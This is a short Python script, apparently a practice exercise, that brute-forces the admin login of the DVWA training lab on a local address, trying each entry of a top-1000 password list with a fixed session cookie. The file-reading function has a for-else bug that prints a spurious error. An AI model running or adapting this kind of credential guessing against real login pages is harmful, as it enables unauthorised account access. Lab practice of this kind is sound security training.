from time import sleep

# low security level
import requests
import os
from bs4 import BeautifulSoup

def read_password(file):
    passwords = []
    if os.path.exists(file):
        with open(file, 'r') as f:
            lines = f.readlines()

    for line in lines:
        line = line.strip().strip('\n').strip('\r').strip('\t')
        passwords.append(line)
    else:
        print('File does not exist')

    return passwords


def main():
    cookie = "PHPSESSID=ehfqmfrtokgnmn6tmkmp4pefm1; security=low"
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.102 Safari/537.36",
        "Cookie": cookie,
    }
    passwords = read_password('../data/top1000_passwords.txt')
    if len(passwords) == 0:
        print('No passwords found')
        return

    print(passwords)
    for password in passwords:
        url = f"http://192.168.0.102:28080/vulnerabilities/brute/?username=admin&password={password}&Login=Login#"
        print(f"---------> {url}")
        r = requests.get(url, headers=headers)
        # print(r.text)
        soup = BeautifulSoup(r.text, 'html.parser')
        result = soup.find('pre')
        if result is not None:
            result = result.text
            if 'Username and/or password incorrect.' == result:
                print('password incorrect')
                continue
            else:
                print('Successfully login')
        else:
            print(f"The password maybe : {password}")
            break
        # sleep(0.5)


if __name__ == '__main__':
    main()